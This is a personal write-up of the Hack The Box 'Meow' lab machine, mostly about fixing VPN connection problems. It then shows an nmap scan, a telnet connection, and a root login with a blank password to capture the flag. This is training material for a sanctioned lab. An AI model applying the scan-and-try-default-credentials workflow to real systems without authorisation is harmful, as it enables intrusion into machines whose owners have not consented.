# HTB Starting Point — Meow Write-up

**Machine:** Meow
**Difficulty:** Very Easy
**Category:** Starting Point
**Target IP:** 10.129.244.183 (changes on every spawn)

---

## 1. Objective

Connect to the HTB lab environment, enumerate the target machine, identify an exposed service, exploit it to gain access, and retrieve the flag.

---

## 2. Environment Setup

Before touching the target, I had to get VPN access working correctly — this ended up being the trickiest part of the whole exercise, and worth documenting for next time.

### Connecting to the VPN

```bash
sudo openvpn --config starting_points_us-starting-point-2-dhcp.ovpn --daemon
```

### Issues encountered (and fixes)

| Problem | Cause | Fix |
|---|---|---|
| `Destination Host Unreachable` when pinging target | VPN connected to the wrong pool (`machines_sg-2.ovpn` — the general Machines VPN, not Starting Point) | Downloaded the correct **Starting Point**-specific `.ovpn` file from the Starting Point access page |
| Still unreachable after reconnecting | Multiple `openvpn` processes running simultaneously, causing routing conflicts | `sudo pkill -9 openvpn` to kill all processes, then reconnected once, cleanly |
| VPN died when terminal closed | Ran `openvpn` in the foreground without `--daemon` | Reconnected with `--config <file>.ovpn --daemon` so it persists in the background |
| `Options error` when using `--daemon` | Filename passed without `--config` flag | Correct syntax: `sudo openvpn --config <file>.ovpn --daemon` |

**Key lesson:** Each HTB pool (Starting Point, Machines, Pro Labs, etc.) uses its **own VPN server** — you must download and connect with the config file specific to that pool. Mixing them, or running multiple VPN sessions at once, breaks routing.

### Verifying the connection

```bash
ip a           # confirm tun0 is up with a 10.10.x.x address
ip route | grep 10.129   # confirm a route exists to the target subnet
ps aux | grep openvpn    # confirm only ONE openvpn process is running
```

Once `tun0` showed a valid IP and the route to `10.129.0.0/16` was present, the target became reachable.

---

## 3. Reconnaissance

Ran an Nmap scan against the target to enumerate open ports and services:

```bash
nmap -sV -sC 10.129.244.183
```

**Result:**

```
23/tcp open  telnet  Linux telnetd
```

Only Telnet was open — an old, unencrypted, unauthenticated-by-default remote login protocol. Given this is an intro-level box, this was the clear intended entry point.

---

## 4. Exploitation

Connected directly to the Telnet service:

```bash
telnet 10.129.244.183
```

First attempt tried `meow` / `meow` as a guessed default credential — this failed (`Login incorrect`).

The actual weakness on this box: the **root** account has **no password set at all**.

```
Meow login: root
Password: [just press Enter]
```

This logged straight in as `root` with zero authentication required — no credentials guessing needed beyond trying the obvious `root` account.

---

## 5. Post-Exploitation

Once inside as root:

```bash
whoami        # confirms root
cat /root/flag.txt   # or wherever the flag file was located
```

Flag captured and submitted on the HTB Meow machine page to mark the box complete.

---

## 6. Lessons Learned / Notes for Next Machine

- **Always double-check which VPN pool you're connecting to** before troubleshooting anything else — this alone caused most of the delay.
- **Always use `--daemon`** (or `tmux`/`screen`) so the VPN survives if a terminal closes.
- **Check for duplicate VPN processes** (`ps aux | grep openvpn`) if connectivity seems broken despite a "successful" connection log.
- On very easy/intro boxes, always check for **default or blank credentials** before anything more advanced — Telnet, FTP, and SSH are common first targets.
- Basic workflow to repeat on future boxes: `nmap -sV -sC <IP>` → identify service → try obvious/default creds → escalate/explore once in.

---

*Write-up by Sounak — HTB Starting Point series*
